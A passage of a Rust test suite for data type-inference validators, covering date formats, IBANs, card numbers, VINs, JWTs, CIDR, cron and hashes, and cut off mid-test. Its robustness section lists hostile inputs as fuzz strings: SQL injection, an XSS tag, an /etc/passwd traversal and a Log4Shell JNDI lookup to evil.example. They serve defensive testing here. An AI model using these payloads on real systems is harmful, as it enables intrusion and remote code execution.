            matching_date_format(&["2023-01-01T12:00:00Z", "2023-06-15T08:30:00.5Z"]),
            Some("%Y-%m-%dT%H:%M:%S%.fZ")
        );
        assert_eq!(
            matching_date_format(&["2023-01-01T12:00:00+0000"]),
            Some("%Y-%m-%dT%H:%M:%S%.f%z")
        );
        // %z accepts a colon offset too, not just the bare form.
        assert_eq!(
            matching_date_format(&["2023-01-01T12:00:00+00:00"]),
            Some("%Y-%m-%dT%H:%M:%S%.f%z")
        );
    }

    #[test]
    fn matching_date_format_recognizes_international_and_full_month_variants() {
        assert_eq!(
            matching_date_format(&["15.01.2024", "20.02.2024"]),
            Some("%d.%m.%Y")
        );
        assert_eq!(
            matching_date_format(&["2024.01.15", "2024.02.20"]),
            Some("%Y.%m.%d")
        );
        assert_eq!(
            matching_date_format(&["January 15, 2024", "February 20, 2024"]),
            Some("%B %d, %Y")
        );
        assert_eq!(
            matching_date_format(&["15 January 2024", "20 February 2024"]),
            Some("%d %B %Y")
        );
    }

    #[test]
    fn matching_date_format_recognizes_rfc2822_and_unix_ctime_forms() {
        // Both are real Jan 15 2024 / Feb 20 2024 dates, correctly labeled
        // Monday/Tuesday - chrono cross-validates %a against the parsed
        // date rather than treating it as a shape-only token, confirmed
        // separately by the mismatched-weekday test below.
        assert_eq!(
            matching_date_format(&[
                "Mon, 15 Jan 2024 10:00:00 +0000",
                "Tue, 20 Feb 2024 11:30:00 +0000"
            ]),
            Some("%a, %d %b %Y %H:%M:%S %z")
        );
        assert_eq!(
            matching_date_format(&["Mon Jan 15 10:00:00 2024", "Tue Feb 20 11:30:00 2024"]),
            Some("%a %b %d %H:%M:%S %Y")
        );
    }

    #[test]
    fn matching_date_format_recognizes_rfc2822_with_literal_gmt_zone() {
        // Found via a real-world sweep of RSS feeds: BBC News's <pubDate>
        // uses a literal "GMT" zone rather than a numeric offset - the
        // same shape RFC 7231's HTTP Date-header grammar itself mandates.
        // %z rejects "GMT" outright (it's not a numeric offset), so this
        // needs its own format entry with "GMT" as literal text, distinct
        // from the numeric-offset RFC 2822 entry above.
        assert_eq!(
            matching_date_format(&[
                "Sun, 23 Aug 2026 21:22:17 GMT",
                "Sun, 23 Aug 2026 21:05:43 GMT"
            ]),
            Some("%a, %d %b %Y %H:%M:%S GMT")
        );
        // A column mixing the numeric-offset and literal-GMT shapes must
        // not silently match either format alone - "no partial credit"
        // applies to date-format detection the same as everywhere else.
        assert_eq!(
            matching_date_format(&[
                "Sun, 23 Aug 2026 21:22:17 GMT",
                "Sun, 23 Aug 2026 21:05:43 +0000"
            ]),
            None
        );
    }

    #[test]
    fn matching_date_format_rejects_a_weekday_that_does_not_match_its_date() {
        // Jan 15 2024 was genuinely a Monday - claiming Tuesday must fail,
        // proving %a is cross-validated against the date, not just parsed
        // as an arbitrary three-letter token.
        assert_eq!(
            matching_date_format(&["Tue, 15 Jan 2024 10:00:00 +0000"]),
            None
        );
    }

    #[test]
    fn matching_date_format_two_digit_year_takes_priority_over_four_digit_for_short_years() {
        // A real, pre-existing chrono characteristic this test locks in:
        // %Y accepts variable-width numeric input while parsing (it only
        // zero-pads on output), so "01/15/24" would otherwise silently
        // parse under %m/%d/%Y as year 24 AD instead of being recognized
        // as a 2-digit year. DATE_FORMATS orders %y forms before their %Y
        // counterparts specifically to prevent this - this test fails if
        // that ordering ever regresses.
        assert_eq!(
            matching_date_format(&["01/15/24", "02/20/24"]),
            Some("%m/%d/%y")
        );
        assert_eq!(
            matching_date_format(&["15/01/24", "20/02/24"]),
            Some("%d/%m/%y")
        );
        assert_eq!(
            matching_date_format(&["15-Jan-24", "20-Feb-24"]),
            Some("%d-%b-%y")
        );
        // A genuinely 4-digit year must still resolve to the %Y form - %y
        // correctly rejects the extra trailing digits rather than
        // truncating, so the fallback here is real, not coincidental.
        assert_eq!(
            matching_date_format(&["01/15/2024", "02/20/2024"]),
            Some("%m/%d/%Y")
        );
        assert_eq!(
            matching_date_format(&["15-Jan-2024", "20-Feb-2024"]),
            Some("%d-%b-%Y")
        );
    }

    #[test]
    fn matching_date_format_recognizes_oracle_style_and_compact_iso_forms() {
        assert_eq!(
            matching_date_format(&["15-Jan-2024", "20-Feb-2024"]),
            Some("%d-%b-%Y")
        );
        assert_eq!(
            matching_date_format(&["20240115T100000", "20240220T113000"]),
            Some("%Y%m%dT%H%M%S")
        );
    }

    #[test]
    fn matching_date_format_recognizes_datetime_variants_without_seconds() {
        assert_eq!(
            matching_date_format(&["2024-01-15 10:00", "2024-02-20 11:30"]),
            Some("%Y-%m-%d %H:%M")
        );
        assert_eq!(
            matching_date_format(&["2024-01-15T10:00", "2024-02-20T11:30"]),
            Some("%Y-%m-%dT%H:%M")
        );
        assert_eq!(
            matching_date_format(&["01/15/2024 10:00", "02/20/2024 11:30"]),
            Some("%m/%d/%Y %H:%M")
        );
        assert_eq!(
            matching_date_format(&["01/15/2024 10:00:00 AM", "02/20/2024 11:30:00 AM"]),
            Some("%m/%d/%Y %I:%M:%S %p")
        );
    }

    #[test]
    fn matching_time_format_recognizes_24h_and_12h_clock_forms() {
        assert_eq!(
            matching_time_format(&["14:30:00", "09:00:00"]),
            Some("%H:%M:%S%.f")
        );
        assert_eq!(matching_time_format(&["14:30", "09:00"]), Some("%H:%M"));
        assert_eq!(matching_time_format(&["not-a-time"]), None);
    }

    #[test]
    fn suggest_ideal_type_prefers_date_and_time_formats_over_leading_zero() {
        // "01/15/2024" and "09:00:00" both have a leading-zero-then-digit
        // prefix, but they're structured dates/times, not IDs that lost a
        // zero - the more specific match must win.
        let (ideal, _) = suggest_ideal_type(&["01/15/2024", "02/20/2024"], "String");
        assert_eq!(ideal, "NaiveDate / DateTime");

        let (ideal, note) = suggest_ideal_type(&["09:00:00", "14:30:00"], "String");
        assert_eq!(ideal, "NaiveTime");
        assert!(!note.contains("leading zeros"));
    }

    #[test]
    fn normalize_numeric_str_handles_parens_negative_percent_and_currency() {
        assert_eq!(
            normalize_numeric_str("(123.45)"),
            ("-123.45".to_string(), false)
        );
        assert_eq!(normalize_numeric_str("45%"), ("45".to_string(), true));
        assert_eq!(
            normalize_numeric_str("€1,250.50"),
            ("1250.50".to_string(), false)
        );
        assert_eq!(normalize_numeric_str("  42  "), ("42".to_string(), false));
        assert_eq!(normalize_numeric_str("(8%)"), ("-8".to_string(), true));
    }

    #[test]
    fn suggest_ideal_type_recognizes_percentages_and_parenthesized_negatives() {
        let (ideal, note) = suggest_ideal_type(&["45%", "10%", "8%"], "String");
        assert_eq!(ideal, "i64");
        assert!(note.contains('%'));

        let (ideal, note) = suggest_ideal_type(&["(120.50)", "300.00", "(12.00)"], "String");
        assert_eq!(ideal, "f64");
        assert!(!note.contains('%'));
    }

    #[test]
    fn suggest_ideal_type_flags_a_literal_infinity_or_nan_value_as_non_finite() {
        // Rust's f64 parser accepts "infinity"/"nan" (any case, signed) as
        // real IEEE-754 values, not a parse error - a stray one in an
        // otherwise-clean numeric column must not sail through silently.
        for word in ["infinity", "Infinity", "-infinity", "inf", "NaN", "+inf"] {
            let (ideal, note) = suggest_ideal_type(&["42.5", word, "100"], "String");
            assert_eq!(ideal, "f64", "word={word}");
            assert!(note.contains("non-finite"), "word={word} note={note}");
        }
    }

    #[test]
    fn suggest_ideal_type_does_not_flag_precision_loss_for_ordinary_i64_sized_values() {
        // A stray non-numeric-shaped value (here, "infinity") blocking the
        // i64 gate must not cause perfectly ordinary small integers in the
        // same column to be wrongly flagged as "overflowed i64" once the
        // whole column falls through to the f64 branch.
        let (ideal, note) = suggest_ideal_type(&["100", "200", "infinity"], "String");
        assert_eq!(ideal, "f64");
        assert!(note.contains("non-finite"));
        assert!(!note.contains("exceed i64"), "note={note}");
    }

    #[test]
    fn suggest_ideal_type_flags_precision_loss_for_values_beyond_i64_range() {
        // These all overflow i64 (max ~9.2e18) and are therefore already
        // past f64's exact-integer range (2^53, ~9e15) too - representing
        // them as float is guaranteed to lose real digits.
        let (ideal, note) = suggest_ideal_type(
            &[
                "123456789012345678901",
                "999999999999999999999",
                "555555555555555555555",
            ],
            "String",
        );
        assert_eq!(ideal, "f64");
        assert!(note.contains("exceed i64"), "note={note}");
        assert!(!note.contains("non-finite"), "note={note}");
    }

    #[test]
    fn is_plain_integer_literal_rejects_decimals_signs_and_empty_strings() {
        assert!(is_plain_integer_literal("123"));
        assert!(is_plain_integer_literal("-123"));
        assert!(!is_plain_integer_literal("12.3"));
        assert!(!is_plain_integer_literal("1e10"));
        assert!(!is_plain_integer_literal(""));
        assert!(!is_plain_integer_literal("-"));
    }

    #[test]
    fn parse_prefixed_int_decodes_hex_binary_and_octal_but_not_bare_hex() {
        assert_eq!(parse_prefixed_int("0x1A"), Some(26));
        assert_eq!(parse_prefixed_int("0b1010"), Some(10));
        assert_eq!(parse_prefixed_int("0o17"), Some(15));
        assert_eq!(parse_prefixed_int("1A"), None); // no prefix - not matched
        assert_eq!(parse_prefixed_int("0x"), None); // prefix with nothing after it
    }

    #[test]
    fn suggest_ideal_type_recognizes_base_prefixed_literals() {
        let (ideal, note) = suggest_ideal_type(&["0x1A", "0xFF", "0x00"], "String");
        assert_eq!(ideal, "i64");
        assert!(note.contains("0x"));
    }

    #[test]
    fn is_mac_address_requires_six_hex_pairs_and_rejects_ipv6_shaped_strings() {
        assert!(is_mac_address("00:1A:2B:3C:4D:5E"));
        assert!(is_mac_address("00-1A-2B-3C-4D-5E"));
        assert!(!is_mac_address("2001:db8::1")); // IPv6, not a MAC
        assert!(!is_mac_address("00:1A:2B:3C:4D")); // only 5 groups
    }

    #[test]
    fn is_iban_validates_real_ibans_and_rejects_a_corrupted_checksum() {
        assert!(is_iban("GB29NWBK60161331926819"));
        assert!(is_iban("DE89370400440532013000"));
        assert!(is_iban("FR1420041010050500013M02606")); // letter in the BBAN
        assert!(!is_iban("GB29NWBK60161331926820")); // last digit tampered
        assert!(!is_iban("not an iban at all"));
    }

    #[test]
    fn is_credit_card_number_validates_luhn_and_rejects_a_bad_checksum() {
        assert!(is_credit_card_number("4111111111111111")); // standard test Visa number
        assert!(is_credit_card_number("4111 1111 1111 1111")); // spaces tolerated
        assert!(!is_credit_card_number("4111111111111112")); // tampered last digit
        assert!(!is_credit_card_number("123")); // too short
    }

    #[test]
    fn ean_check_digit_valid_accepts_known_real_ean13_upc_a_and_isbn13() {
        assert!(ean_check_digit_valid(&digits_of("4006381333931").unwrap()));
        assert!(ean_check_digit_valid(&digits_of("036000291452").unwrap()));
        assert!(ean_check_digit_valid(&digits_of("9780306406157").unwrap()));
        assert!(!ean_check_digit_valid(&digits_of("4006381333930").unwrap())); // tampered
    }

    #[test]
    fn is_isbn10_accepts_a_known_valid_isbn_and_an_x_check_digit() {
        assert!(is_isbn10("0306406152"));
        assert!(!is_isbn10("0306406153")); // tampered
        assert!(is_isbn10("097522980X"));
    }

    #[test]
    fn is_isbn13_requires_the_bookland_prefix_not_just_a_valid_checksum() {
        assert!(is_isbn13("9780306406157"));
        assert!(!is_isbn13("4006381333931")); // valid EAN-13 checksum, but no 978/979 prefix
    }

    #[test]
    fn is_ean_or_upc_accepts_12_or_13_digit_checksummed_barcodes() {
        assert!(is_ean_or_upc("4006381333931")); // EAN-13
        assert!(is_ean_or_upc("036000291452")); // UPC-A
        assert!(!is_ean_or_upc("036000291453")); // tampered
    }

    #[test]
    fn suggest_ideal_type_recognizes_isbn_and_ean_upc() {
        let (ideal, _) = suggest_ideal_type(&["0306406152", "097522980X"], "String");
        assert_eq!(ideal, "ISBN-10");

        let (ideal, _) = suggest_ideal_type(&["9780306406157"], "String");
        assert_eq!(ideal, "ISBN-13");

        let (ideal, _) = suggest_ideal_type(&["4006381333931", "036000291452"], "String");
        assert_eq!(ideal, "EAN-13 / UPC-A");
    }

    #[test]
    fn is_semver_accepts_core_prerelease_and_build_forms_rejects_leading_zeros() {
        assert!(is_semver("1.2.3"));
        assert!(is_semver("2.0.0-beta.1"));
        assert!(is_semver("1.0.0+build.123"));
        assert!(is_semver("1.0.0-rc.1+build.5"));
        assert!(!is_semver("01.2.3")); // leading zero on a numeric identifier
        assert!(!is_semver("1.2")); // only 2 components
        assert!(!is_semver("1.2.3.4")); // 4 components - would be an IPv4 octet count instead
    }

    #[test]
    fn is_embedded_json_accepts_object_and_array_but_not_a_bare_scalar() {
        assert!(is_embedded_json(r#"{"a":1,"b":2}"#));
        assert!(is_embedded_json("[1,2,3]"));
        assert!(!is_embedded_json("5")); // bare scalar - handled by the numeric check instead
        assert!(!is_embedded_json("not json"));
    }

    #[test]
    fn suggest_ideal_type_recognizes_semver_and_embedded_json() {
        let (ideal, _) = suggest_ideal_type(&["1.2.3", "2.0.0-beta.1"], "String");
        assert_eq!(ideal, "SemVer");

        let (ideal, note) = suggest_ideal_type(&[r#"{"a":1}"#, "[1,2,3]"], "String");
        assert_eq!(ideal, "String");
        assert!(note.contains("embedded JSON"));
    }

    #[test]
    fn suggest_ideal_type_recognizes_iban_and_credit_card_number() {
        let (ideal, _) = suggest_ideal_type(
            &["GB29NWBK60161331926819", "DE89370400440532013000"],
            "String",
        );
        assert_eq!(ideal, "IBAN");

        let (ideal, _) = suggest_ideal_type(&["4111111111111111", "5500005555555559"], "String");
        assert_eq!(ideal, "Credit Card Number");
    }

    #[test]
    fn is_hex_color_accepts_all_four_lengths_and_rejects_near_misses() {
        assert!(is_hex_color("#FF5733"));
        assert!(is_hex_color("#fff"));
        assert!(is_hex_color("#00000000"));
        assert!(!is_hex_color("FF5733")); // missing '#'
        assert!(!is_hex_color("#GG5733")); // non-hex digit
        assert!(!is_hex_color("#FF573")); // 5 digits - not 3/4/6/8
    }

    #[test]
    fn is_imei_validates_a_known_real_imei_and_rejects_a_tampered_one() {
        // A widely-used reference IMEI in Luhn-algorithm documentation.
        assert!(is_imei("490154203237518"));
        assert!(!is_imei("490154203237519")); // last digit tampered
        assert!(!is_imei("49015420323751")); // 14 digits, too short
    }

    #[test]
    fn suggest_ideal_type_recognizes_hex_color_and_imei() {
        let (ideal, _) = suggest_ideal_type(&["#FF5733", "#00FF00", "#000"], "String");
        assert_eq!(ideal, "Hex Color");

        let (ideal, _) = suggest_ideal_type(&["490154203237518"], "String");
        assert_eq!(ideal, "IMEI");
    }

    // The canonical reference VIN used throughout VIN-checksum
    // documentation, hand-recomputed independently (not just trusted from
    // is_vin's own output) before being relied on:
    //   positions:  1=1 2=H 3=G 4=C 5=M 6=8 7=2 8=6 9=3 10=3 11=A 12=0 13=0 14=4 15=3 16=5 17=2
    //   values:     1  8  7  3  4  8  2  6  -  3  1  0  0  4  3  5  2   (position 9 excluded, weight 0)
    //   weights:    8  7  6  5  4  3  2 10  0  9  8  7  6  5  4  3  2
    //   products:   8 56 42 15 16 24 4 60  0 27  8  0  0 20 12 15  4
    //   sum = 311, 311 % 11 = 3 -> expected check digit '3', matches position 9's '3'.
    const REFERENCE_VIN: &str = "1HGCM82633A004352";

    #[test]
    fn is_vin_validates_the_canonical_reference_vin_and_rejects_a_tampered_one() {
        assert!(is_vin(REFERENCE_VIN));
        assert!(!is_vin("1HGCM82633A004353")); // check digit off by one
        assert!(!is_vin("1HGCM82633A00435")); // 16 chars, too short
        assert!(!is_vin("1HGCM82633A0043522")); // 18 chars, too long
        assert!(!is_vin("1HGCM8263IA004352")); // contains 'I' - not a valid VIN character
    }

    #[test]
    fn vin_char_value_excludes_i_o_and_q() {
        assert_eq!(vin_char_value(b'I'), None);
        assert_eq!(vin_char_value(b'O'), None);
        assert_eq!(vin_char_value(b'Q'), None);
        assert_eq!(vin_char_value(b'A'), Some(1));
        assert_eq!(vin_char_value(b'9'), Some(9));
    }

    #[test]
    fn suggest_ideal_type_recognizes_vin() {
        let (ideal, note) = suggest_ideal_type(&[REFERENCE_VIN], "String");
        assert_eq!(ideal, "VIN");
        assert!(note.contains("Vehicle Identification Number"));
    }

    #[test]
    fn is_cidr_validates_address_and_prefix_range_for_v4_and_v6() {
        assert!(is_cidr("192.168.1.0/24"));
        assert!(is_cidr("10.0.0.0/8"));
        assert!(is_cidr("2001:db8::/32"));
        assert!(is_cidr("::/0"));
        assert!(!is_cidr("192.168.1.0/33")); // IPv4 prefix max is 32
        assert!(!is_cidr("2001:db8::/129")); // IPv6 prefix max is 128
        assert!(!is_cidr("192.168.1.0")); // no prefix at all
        assert!(!is_cidr("not-an-address/24"));
        assert!(!is_cidr("192.168.1.256/24")); // invalid octet
    }

    #[test]
    fn suggest_ideal_type_recognizes_cidr() {
        let (ideal, note) = suggest_ideal_type(&["192.168.1.0/24", "10.0.0.0/8"], "String");
        assert_eq!(ideal, "CIDR");
        assert!(note.contains("CIDR"));
    }

    // jwt.io's own canonical example token - the header decodes to
    // {"alg":"HS256","typ":"JWT"}, the payload to a claims object.
    const REFERENCE_JWT: &str = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

    #[test]
    fn base64url_decode_matches_a_known_jwt_header_and_rejects_padding_free_edge_cases() {
        let decoded = base64url_decode("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9").unwrap();
        assert_eq!(
            String::from_utf8(decoded).unwrap(),
            r#"{"alg":"HS256","typ":"JWT"}"#
        );
        assert!(base64url_decode("").is_none());
        assert!(base64url_decode("not valid base64url!!").is_none());
    }

    #[test]
    fn is_jwt_validates_a_real_token_and_rejects_near_misses() {
        assert!(is_jwt(REFERENCE_JWT));
        assert!(!is_jwt("not.a.jwt")); // segments don't decode to JSON objects
        assert!(!is_jwt("only.two")); // only 2 segments
        assert!(!is_jwt("a.b.c.d")); // 4 segments
        assert!(!is_jwt("..")); // empty segments
        // header decodes to a JSON array, not an object - RFC 7519 requires
        // both header and payload to be objects.
        let array_header = "WyJhIiwiYiJd"; // base64url("[\"a\",\"b\"]")
        assert!(!is_jwt(&format!("{array_header}.{array_header}.sig")));
    }

    #[test]
    fn suggest_ideal_type_recognizes_jwt() {
        let (ideal, note) = suggest_ideal_type(&[REFERENCE_JWT], "String");
        assert_eq!(ideal, "JWT");
        assert!(note.contains("JSON Web Token"));
    }

    #[test]
    fn is_lat_lon_pair_requires_decimals_and_valid_ranges() {
        assert!(is_lat_lon_pair("40.7128,-74.0060")); // New York
        assert!(is_lat_lon_pair("-33.8688, 151.2093")); // Sydney, with a space
        assert!(!is_lat_lon_pair("1,2")); // no decimal point at all - too weak a signal
        assert!(!is_lat_lon_pair("91.0,0.0")); // latitude out of range
        assert!(!is_lat_lon_pair("0.0,181.0")); // longitude out of range
        assert!(!is_lat_lon_pair("40.7128")); // no comma at all
        assert!(!is_lat_lon_pair("40.7128,-74.0060,10.5")); // 3 components, not a pair
    }

    #[test]
    fn suggest_ideal_type_recognizes_geographic_coordinates() {
        let (ideal, note) = suggest_ideal_type(&["40.7128,-74.0060", "51.5074,-0.1278"], "String");
        assert_eq!(ideal, "Geographic Coordinates");
        assert!(note.contains("lat,lon"));
    }

    #[test]
    fn is_wkt_geometry_accepts_standard_keywords_and_rejects_near_misses() {
        assert!(is_wkt_geometry("POINT(30 10)"));
        assert!(is_wkt_geometry("LINESTRING(30 10, 10 30, 40 40)"));
        assert!(is_wkt_geometry(
            "POLYGON((30 10, 40 40, 20 40, 10 20, 30 10))"
        ));
        assert!(is_wkt_geometry("point(30 10)")); // case-insensitive keyword
        assert!(!is_wkt_geometry("CIRCLE(30 10, 5)")); // not a real WKT keyword
        assert!(!is_wkt_geometry("POINT30 10")); // missing parens entirely
        assert!(!is_wkt_geometry("POINT(30 10")); // unterminated - missing ')'
        assert!(!is_wkt_geometry("POINT(30 abc)")); // letters aren't valid coordinate content
        // Deliberately out of scope: GEOMETRYCOLLECTION nests other
        // geometry keywords, which this structural (non-recursive) check
        // can't validate - found empirically, not just reasoned about (see
        // WKT_KEYWORDS's own comment).
        assert!(!is_wkt_geometry("GEOMETRYCOLLECTION(POINT(4 6))"));
    }

    #[test]
    fn suggest_ideal_type_recognizes_wkt_geometry() {
        let (ideal, note) =
            suggest_ideal_type(&["POINT(30 10)", "LINESTRING(30 10, 10 30)"], "String");
        assert_eq!(ideal, "WKT Geometry");
        assert!(note.contains("Well-Known Text"));
    }

    #[test]
    fn is_cron_expression_accepts_standard_forms_and_rejects_out_of_range_fields() {
        assert!(is_cron_expression("0 0 * * *")); // daily at midnight
        assert!(is_cron_expression("*/15 * * * *")); // every 15 minutes
        assert!(is_cron_expression("0 9-17 * * 1-5")); // hourly, 9-5, weekdays
        assert!(is_cron_expression("0,30 * * * *")); // list: every 0 and 30 min
        assert!(!is_cron_expression("0 0 * *")); // only 4 fields
        assert!(!is_cron_expression("60 0 * * *")); // minute 60 - max is 59
        assert!(!is_cron_expression("0 0 * * 8")); // day-of-week 8 - max is 7
        assert!(!is_cron_expression("0 0 32 * *")); // day-of-month 32 - max is 31
        assert!(!is_cron_expression("a b c d e")); // not numeric or '*' at all
    }

    #[test]
    fn suggest_ideal_type_recognizes_cron_expression() {
        let (ideal, note) = suggest_ideal_type(&["0 0 * * *", "*/15 * * * *"], "String");
        assert_eq!(ideal, "Cron Expression");
        assert!(note.contains("cron"));
    }

    #[test]
    fn hash_digest_kind_classifies_by_exact_length_and_rejects_non_hex_or_mixed_lengths() {
        let md5 = "d41d8cd98f00b204e9800998ecf8427e"; // 32 hex chars
        let sha1 = "da39a3ee5e6b4b0d3255bfef95601890afd80709"; // 40 hex chars
        let sha256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"; // 64 hex chars
        assert_eq!(hash_digest_kind(md5), Some("MD5"));
        assert_eq!(hash_digest_kind(sha1), Some("SHA-1"));
        assert_eq!(hash_digest_kind(sha256), Some("SHA-256"));
        assert_eq!(hash_digest_kind("not hex at all, wrong length"), None);
        assert_eq!(hash_digest_kind("d41d8cd98f00b204e9800998ecf842"), None); // 30 hex chars, no match
    }

    #[test]
    fn suggest_ideal_type_flags_a_hash_digest_length_as_a_note_not_a_type_change() {
        let md5s = [
            "d41d8cd98f00b204e9800998ecf8427e",
            "5d41402abc4b2a76b9719d911017c592",
        ];
        let (ideal, note) = suggest_ideal_type(&md5s, "String");
        // Deliberately stays String - there's no checksum backing this, so
        // it must never be promoted to its own confident type the way
        // UUID/IMEI/etc. are.
        assert_eq!(ideal, "String");
        assert!(note.contains("MD5"));
        assert!(note.contains("shape only"));
    }

    #[test]
    fn is_ulid_validates_the_canonical_example_and_rejects_near_misses() {
        // The canonical example from the ULID spec itself.
        assert!(is_ulid("01ARZ3NDEKTSV4RRFFQ69G5FAV"));
        assert!(is_ulid("01arz3ndektsv4rrffq69g5fav")); // lowercase - decoding is case-insensitive
        assert!(!is_ulid("01ARZ3NDEKTSV4RRFFQ69G5FA")); // 25 chars, too short
        assert!(!is_ulid("01ARZ3NDEKTSV4RRFFQ69G5FAVX")); // 27 chars, too long
        assert!(!is_ulid("01ARZ3NDEKTSVILRFFQ69G5FAV")); // contains 'I' - not in Crockford's alphabet
        assert!(!is_ulid("81ARZ3NDEKTSV4RRFFQ69G5FAV")); // first char '8' - overflows the 48-bit timestamp
    }

    #[test]
    fn suggest_ideal_type_recognizes_ulid() {
        let (ideal, note) = suggest_ideal_type(&["01ARZ3NDEKTSV4RRFFQ69G5FAV"], "String");
        assert_eq!(ideal, "ULID");
        assert!(note.contains("ULID"));
    }

    #[test]
    fn suggest_ideal_type_recognizes_uuid_email_ipv4_ipv6_and_url() {
        let (ideal, note) = suggest_ideal_type(
            &[
                "550e8400-e29b-41d4-a716-446655440000",
                "16fd2706-8baf-433b-82eb-8c7fada847da",
            ],
            "String",
        );
        assert_eq!(ideal, "UUID");
        assert!(note.contains("UUID"));

        let (ideal, _) = suggest_ideal_type(&["alice@example.com", "bob@example.org"], "String");
        assert_eq!(ideal, "Email");

        let (ideal, _) = suggest_ideal_type(&["192.168.1.1", "10.0.0.5"], "String");
        assert_eq!(ideal, "IPv4");

        let (ideal, _) = suggest_ideal_type(&["2001:db8::1", "2001:db8::2"], "String");
        assert_eq!(ideal, "IPv6");

        let (ideal, _) =
            suggest_ideal_type(&["https://example.com/a", "http://example.org/b"], "String");
        assert_eq!(ideal, "URL");
    }

    #[test]
    fn is_uuid_rejects_wrong_length_and_non_hex_segments() {
        assert!(is_uuid("550e8400-e29b-41d4-a716-446655440000"));
        assert!(!is_uuid("550e8400-e29b-41d4-a716-44665544000")); // 35 chars
        assert!(!is_uuid("not-a-uuid-at-all-not-a-uuid-at-all"));
    }

    #[test]
    fn is_email_rejects_missing_at_or_dotless_domain() {
        assert!(is_email("user@example.com"));
        assert!(!is_email("user example.com"));
        assert!(!is_email("user@localhost")); // no '.' in domain
        assert!(!is_email("user@@example.com"));
    }

    #[test]
    fn is_email_accepts_real_domains_with_digits_and_hyphens() {
        // Found via a real-world sweep against the "userdata" sample Avro
        // dataset: these are all genuine, currently-in-use domains
        // (163.com is a major Chinese email provider, t-online.de a major
        // German ISP, so-net.ne.jp a real multi-level Japanese domain) -
        // only the final TLD segment needs to be alphabetic, so digits and
        // hyphens earlier in the domain never disqualify it. Locks in a
        // real finding: the dataset's own email column staying untyped
        // turned out to be caused by unrelated empty-string values, not a
        // gap here - this proves that conclusion rather than just
        // asserting it in a comment.
        assert!(is_email("bcollins18@list-manage.com"));
        assert!(is_email("gferguson1h@51.la"));
        assert!(is_email("wpalmer1k@t-online.de"));
        assert!(is_email("afuller9z@163.com"));
        assert!(is_email("acoleman6h@so-net.ne.jp"));
    }

    #[test]
    fn is_url_requires_a_recognized_scheme_and_non_empty_rest() {
        assert!(is_url("https://example.com"));
        assert!(!is_url("example.com"));
        assert!(!is_url("https://"));
    }

    #[test]
    fn is_ipv4_and_is_ipv6_only_match_their_own_grammar() {
        assert!(is_ipv4("127.0.0.1"));
        assert!(!is_ipv4("2001:db8::1"));
        assert!(is_ipv6("2001:db8::1"));
        assert!(!is_ipv6("127.0.0.1"));
    }

    #[test]
    fn is_missing_sentinel_matches_common_placeholder_tokens_case_insensitively() {
        assert!(is_missing_sentinel("NA"));
        assert!(is_missing_sentinel("n/a"));
        assert!(is_missing_sentinel(" Null "));
        assert!(is_missing_sentinel("-"));
        assert!(!is_missing_sentinel("Namibia")); // must not substring-match "NA"
        assert!(!is_missing_sentinel("42"));
    }

    #[test]
    fn is_missing_sentinel_matches_mysql_hive_redshift_backslash_n() {
        // MySQL's SELECT INTO OUTFILE, Hive's default text SerDe, and
        // Redshift's UNLOAD ... NULL AS '\N' all write literal backslash-N
        // for a null field - a real, common convention in cloud-warehouse
        // CSV/TSV exports, not a pandas default like the rest of this list.
        assert!(is_missing_sentinel("\\N"));
        assert!(is_missing_sentinel("\\n")); // matched case-insensitively, like every other entry
        assert!(!is_missing_sentinel("N")); // the backslash is load-bearing, not just the letter
    }

    // --- Adversarial / robustness tests -----------------------------------
    // These exist to prove reliability under hostile input, not just typical
    // input: every validator below does byte-level or string-slicing work of
    // some kind, and a str-slice at a byte offset that isn't a UTF-8 char
    // boundary panics in Rust - a real risk for any function fed arbitrary
    // file content. Each case here either (a) proves a specific slicing
    // operation is safe by construction, not just by inspection, or (b)
    // proves a checksum/grammar check can't be fooled by an off-by-one
    // near-miss.

    /// A grab-bag of hostile strings: empty, control characters, multi-byte
    /// unicode (including 4-byte emoji, to stress anything doing byte
    /// arithmetic), injection-style payloads (SQL/shell/template/path), and
    /// degenerate near-numeric strings. None of these should make any
    /// validator panic, regardless of what they return.
    const ADVERSARIAL_STRINGS: &[&str] = &[
        "",
        " ",
        "\0",
        "\0\0\0",
        "\n\t\r",
        "💥",
        "🔥🔥🔥🔥🔥🔥🔥🔥",
        "é",
        "café",
        "café💰100",
        "(café)",
        "(💰100€)",
        "'; DROP TABLE users; --",
        "<script>alert(1)</script>",
        "../../../../etc/passwd",
        "%s%s%s%s%s%n",
        "{}{}{}{}",
        "${jndi:ldap://evil.example/a}",
        "\u{200B}\u{200B}\u{200B}", // zero-width spaces
        "\u{FEFF}",                 // BOM
        "-----------------------------",
        "0000000000000000000000000000",
        "99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999",
        "-",
        "--",
        "+",
        "++",
        "0x",
        "0b",
        "0o",
        "0xZZZZ",
        ".",
        "..",
        "...",
        "@",
        "@@@@",
        ":::::::::",
        "-.-.-.-.-.-",
        "GB29café1234567890", // IBAN-shaped prefix, multi-byte payload
    ];

    #[test]
    fn every_validator_survives_adversarial_input_without_panicking() {
        for s in ADVERSARIAL_STRINGS {
            let _ = is_uuid(s);
            let _ = is_ulid(s);
            let _ = is_email(s);
            let _ = is_url(s);
            let _ = is_ipv4(s);
            let _ = is_ipv6(s);
            let _ = is_cidr(s);
            let _ = is_mac_address(s);
            let _ = is_iban(s);
            let _ = is_credit_card_number(s);
            let _ = is_isbn10(s);
            let _ = is_isbn13(s);
            let _ = is_ean_or_upc(s);
            let _ = is_semver(s);
            let _ = is_embedded_json(s);
            let _ = is_hex_color(s);
            let _ = is_imei(s);
            let _ = is_vin(s);
            let _ = is_jwt(s);
            let _ = base64url_decode(s);
            let _ = is_wkt_geometry(s);
            let _ = is_lat_lon_pair(s);
            let _ = is_cron_expression(s);
            let _ = hash_digest_kind(s);
            let _ = parse_prefixed_int(s);
            let _ = is_missing_sentinel(s);
            let _ = has_leading_zero(s);
            let _ = is_bool_word(s);
            let _ = normalize_numeric_str(s);
            let _ = is_plain_integer_literal(s);
            let _ = matching_date_format(&[s]);
            let _ = matching_time_format(&[s]);
            let _ = suggest_ideal_type(&[s], "String");
        }
    }

    #[test]
    fn every_validator_survives_a_single_extremely_long_value_without_panicking() {
